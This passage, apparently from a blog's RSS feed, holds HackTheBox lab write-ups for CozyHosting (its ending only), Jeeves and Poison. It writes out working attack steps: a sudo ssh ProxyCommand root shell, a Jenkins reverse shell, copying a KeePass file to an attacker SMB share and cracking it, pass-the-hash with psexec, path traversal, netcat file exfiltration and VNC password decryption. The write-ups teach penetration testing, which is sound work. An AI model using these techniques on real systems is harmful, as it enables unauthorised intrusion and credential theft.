<pre tabindex="0"><code>josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39; x
root@cozyhosting:/tmp# whoami
root
</code></pre><p>And with that, CozyHosting is owned.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Jeeves</title>
      <link>http://localhost:1313/posts/jeeves/</link>
      <pubDate>Mon, 11 Nov 2024 12:54:22 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/jeeves/</guid>
      <description><![CDATA[<p><img src="/img/jeeves/jeeves.png#center" alt="Jeeves"></p>
<h2 id="description">Description</h2>
<p>Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator&rsquo;s NTLM hash.</p>
<h2 id="recon">Recon</h2>
<p>Starting off with a nmap scan:</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Mon Nov 11 12:55:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-12T00:05:55
|_  start_date: 2024-11-11T23:57:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.96 ms 10.10.14.1
2   45.71 ms 10.10.10.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 13:05:35 2024 -- 1 IP address (1 host up) scanned in 214.46 seconds
</code></pre><p>I found several services, including SMB, RPC, and two HTTP servers on ports 80 and 50000. Enumerating the web server on port 80 and SMB do not reveal anything interesting. I was able to use RPC to find some endpoints, but I did not see anyway I could exploit Jeeves with the information.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -p 135 10.10.10.63
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.10.63
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.63[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]
          ncalrpc:[WMsgKRpc097A31]

Protocol: N/A 
Provider: N/A 
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
Bindings: 
          ncalrpc:[LRPC-f01d6a34deb1026cb0]
          ncalrpc:[dabrpc]
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-f24b240fdec2bc8c52]
          ncalrpc:[LRPC-bb6163cae863dbd5f9]
          ncalrpc:[LRPC-82dd959ab6b7e8366d]
          ncacn_np:\\JEEVES[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-300bf2e2daeee2de9a]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

...
</code></pre><p>However, I did find an interesting directory on the port 50000 website.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -C 404 -n
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves =&gt; http://10.10.10.63:50000/askjeeves/
[####################] - 2m    119601/119601  0s      found:1       errors:0      
[####################] - 2m    119601/119601  1048/s  http://10.10.10.63:50000/
</code></pre><p>We find a Jenkins dashboard.</p>
<p><img src="/img/jeeves/jenkins_web.png" alt="Jenkins Server"></p>
<p>Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking <code>config.xml</code> and finding the unsecured authorization strategy in use.</p>
<p><code>&lt;authorizationStrategy class=&quot;hudson.security.AuthorizationStrategy$Unsecured&quot;/&gt;</code></p>
<h2 id="foothold">Foothold</h2>
<p>We can leverage our permissions to access the Script Console by going to &ldquo;Mange Jenkins&rdquo; &gt; &ldquo;Script Console&rdquo;.</p>
<p><img src="/img/jeeves/script_console.png" alt="Jenkins Script Console"></p>
<p>Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.63] 49681
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins&gt;
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.</p>
<pre tabindex="0"><code>C:\Temp&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</code></pre><p>Unfortunately, this turns out to be a false lead. We&rsquo;ll have to look for other privesc vectors.</p>
<pre tabindex="0"><code>C:\Temp&gt;.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
[*] CombaseModule: 0x140717164658688
[*] DispatchTable: 0x140717166622152
[*] UseProtseqFunction: 0x140717166124880
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0f34-ffff-9033-ef4aa84d1797
[*] DCOM obj OXID: 0xb7f5e435d7866f08
[*] DCOM obj OID: 0x59d6cba54f6519d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
</code></pre><p>Eventually, I come across a KeePass database file.</p>
<pre tabindex="0"><code>C:\&gt;dir /s /b *.kdbx
dir /s /b *.kdbx
C:\Users\kohsuke\Documents\CEH.kdbx
</code></pre><p>KeePass files are password-protected and I don&rsquo;t have the utilities to crack the password on Jeeves, so I set up a SMB share to exfiltrate the file to my attacker machine.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-smbserver transfer /tmp/transfer -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Now to mount the share and transfer CEH.kdbx.</p>
<pre tabindex="0"><code>C:\Users\kohsuke\Documents&gt;net use M: \\10.10.14.31\transfer
net use M: \\10.10.14.31\transfer
The command completed successfully.


C:\Users\kohsuke\Documents&gt;copy CEH.kdbx M:
copy CEH.kdbx M:
        1 file(s) copied.
</code></pre><p>Next we can extract the KeePass password hash and crack it.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/transfer]
└─$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/transfer]
└─$ hashcat -a 0 &#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48&#39; /usr/share/wordlists/rockyou.txt -m 13400
</code></pre><p>We get the password <code>moonshine1</code>. We can now view the contents of CEH.kdbx.</p>
<pre tabindex="0"><code>kpcli:/&gt; ls
=== Groups ===
CEH/
kpcli:/&gt; cd CEH
kpcli:/CEH&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH&gt; 
</code></pre><p>Inside the CEH group, we find some entries and more groups. Further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; ls *
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

/CEH/eMail:

/CEH/General:

/CEH/Homebanking:

/CEH/Internet:

/CEH/Network:

/CEH/Windows:
</code></pre><p>There are usernames and password hashes in the entries. I created a user wordlist as well as a password wordlist and sprayed them against Jeeves. In retrospect, this was not necessary since most of these users do not exist on the machine, so I could&rsquo;ve narrowed down my users to <code>Administrator</code>.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH&gt; show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH&gt; show -f 4

Title: It&#39;s a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH&gt; show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don&#39;t even need creds! Unhackable! 

kpcli:/CEH&gt; show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
</code></pre><p>None of the passwords worked, so I tried a pass-the-hash attack using the hash in entry 0 and gained access to the Administrator account.</p>
<p><img src="/img/jeeves/pwned.png" alt="Pass-the-hash"></p>
<p>And with that, Jeeves is owned.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-psexec Administrator@10.10.10.63 -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EXTSwcYV.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service ShHJ on 10.10.10.63.....
[*] Starting service ShHJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; 
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Poison</title>
      <link>http://localhost:1313/posts/poison/</link>
      <pubDate>Mon, 16 Sep 2024 20:59:17 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/poison/</guid>
      <description><![CDATA[<p><img src="/img/poison/poison.png#center" alt="Poison"></p>
<h2 id="description">Description</h2>
<p>Poison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.</p>
<h2 id="recon">Recon</h2>
<p>We start by running a Nmap scan against the target.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A 10.10.10.84 -T5   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 01:19 GMT
Warning: 10.10.10.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (96%), FreeBSD 11.3-RELEASE (96%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.1-RELEASE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   40.51 ms 10.10.14.1
2   40.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.47 seconds
</code></pre><p>The scan shows that TCP ports 22 and 80 are open. Visiting the webpage on port 80, we can see a website with the title &ldquo;Temporary website to test local .php scripts&rdquo;.</p>
<p><img src="/img/poison/website.png" alt="website"></p>
<p>There is a list of files that we can test. I tried listfiles.php. The output was messy, so I used view source to get a cleaner view.</p>
<p><img src="/img/poison/listfiles.png" alt="listfiles.php result"></p>
<p>We get a directory listing. It appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can&rsquo;t get a shell through RFI :(. We could also try other attack vectors like log poisoning (which does give you shell as <code>www-data</code>), but there is an interesting file &ldquo;pwdbackup.txt&rdquo; that we can check out first.</p>
<p><img src="/img/poison/encodedpass.png" alt="pwdbackup text"></p>
<p>Success! Now all we need to do is decode the password. We will need to do this 13 times, as implied by the note from out unsuspecting target. This can be done by passing the password to <code>base64 -d</code> manually, but it&rsquo;s far simpler to use a script. I&rsquo;ve provided one below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>encoded_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..13<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        encoded_pass<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>After running the script, we get our password <code>Charix!2#4%6&amp;8(0</code>.</p>
<h2 id="foothold">Foothold</h2>
<p>We have a password, but we don&rsquo;t know any users we could potentially authenticate as. Recall that the webpage can read files. Since we know that the target machine is likely FreeBSD, a Unix-like OS, we can try to read the <code>/etc/passwd</code> to find users.</p>
<p><img src="/img/poison/traversal_passwd.png" alt="/etc/passwd file"></p>
<p>Notice there are three users: <code>root</code>, <code>toor</code>, and <code>charix</code> that seem interesting. We can spray our password against these accounts via ssh. It is true that <code>Charix!2#4%6&amp;8(0</code> is likely the password for <code>charix</code>, it&rsquo;s still worth checking the other accounts for password reuse.</p>
<p><img src="/img/poison/pass_spray.png" alt="Password spray"></p>
<p>And now we can authenticate as <code>charix</code> to the server.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Now that we have a shell, we can move onto privilege escalation. Feel free to grab the user flag, but there is also a <code>secret.zip</code> file that might be interesting. It&rsquo;s password protected though, and I find files easier to investigate when they are on my local machine. So I transferred the zip file to Kali.</p>
<p>On Kali:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 8000 &gt; secret.zip            
listening on [any] 8000 ...
</code></pre><p>On Poison:</p>
<pre tabindex="0"><code>charix@Poison:~ % nc -nv 10.10.14.33 8000 &lt; secret.zip
Connection to 10.10.14.33 8000 port [tcp/*] succeeded!
</code></pre><p>Before trying to crack the password, we can test for password reuse by supplying the password we got for <code>charix</code> . It succeeds and we get a <code>secret</code> file that appears to be random binary data. I couldn&rsquo;t figure out its purpose at this point, so I decided to enumerate further. I noticed three TCP ports only accessible from localhost on Poison: 25, 5801, and 5901.</p>
<pre tabindex="0"><code>charix@Poison:~ % sockstat -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      728   4  tcp4   *:80                  *:*
charix   sshd       719   3  tcp4   10.10.10.84:22        10.10.14.33:57270
root     sshd       716   3  tcp4   10.10.10.84:22        10.10.14.33:57270
www      httpd      704   4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
</code></pre><p>I had already checked for any mail-related privesc vectors at this point, so I was more interested in ports 5801 and 5901. However, since they were only accessible by localhost on Poison, I had to forward them to my attacker machine.</p>
<pre tabindex="0"><code># Forward Port 5801
ssh -N -L 5801:127.0.0.1:5801 charix@10.10.10.84

# Forward Port 5901
ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
</code></pre><p>Now we can do some more enumeration.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p5801,5901 127.0.0.1 -sV --script=default
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 19:27 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000097s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds
</code></pre><p>VNC is running on port 5901. VNC is a system designed to share screens. This means that a user using VNC can interact with&hellip; The VNC password file is usually stored in <code>~/.vnc/passwd</code>. This path does not exist for <code>charix</code> though, but there was a <code>passwd</code> file that we extracted from <code>secret.zip</code>. We can check if it it indeed a VNC password file by attempting to extract a VNC password:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
VNCP@$$!
</code></pre><p>Success! Now that we are certain we have a VNC password file, we can use it to connect to Poison.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ vncviewer -passwd secret 127.0.0.1::5901
</code></pre><p><img src="/img/poison/vnc_pwn.png" alt="vnc successful connect"></p>
<p>And with that, we have root on the machine.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
